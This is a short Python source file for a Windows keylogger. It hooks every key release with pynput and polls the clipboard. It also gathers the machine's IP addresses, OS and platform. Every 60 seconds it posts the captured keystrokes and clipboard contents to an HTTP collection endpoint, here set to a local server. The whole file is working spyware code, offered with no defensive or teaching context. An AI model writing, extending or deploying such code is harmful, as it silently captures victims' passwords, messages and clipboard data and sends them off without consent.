import threading
from pynput import keyboard
import requests
import time
from get_info import get_sys_info
import win32clipboard

keys = []
keys_url = "http://127.0.0.1:8080/log"
sys_info_url = "http://127.0.0.1:8080/sys_info"
clipboard = ""

#system info
ips, _os, _platform = get_sys_info()
system_info = {"ip": ips,
               "os": _os,
               "platform": _platform}
requests.post(sys_info_url, json=system_info)

#clipboard
def get_clipboard():
    global clipboard
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        if clipboard != data:
            clipboard = data
    except TypeError:
        clipboard = "Non Text Content Detected"

def release(key):
    if hasattr(key, "char") and key is not None:
        if key.char.isprintable():
            keys.append(key.char)
    elif key == keyboard.Key.space:
        keys.append(' ')
    elif key == keyboard.Key.enter:
        keys.append("\n")



def send_keys_clip_to_api():
    while True:
        if keys:
            response = requests.post(keys_url, json={"keys": keys, "clipboard": clipboard})
            if response.status_code == 200:
                keys.clear()
        get_clipboard()
        time.sleep(60)

listener = keyboard.Listener(on_release=release)
listener.start()

send_thread = threading.Thread(target=send_keys_clip_to_api, daemon=True)
send_thread.start()

listener.join()
    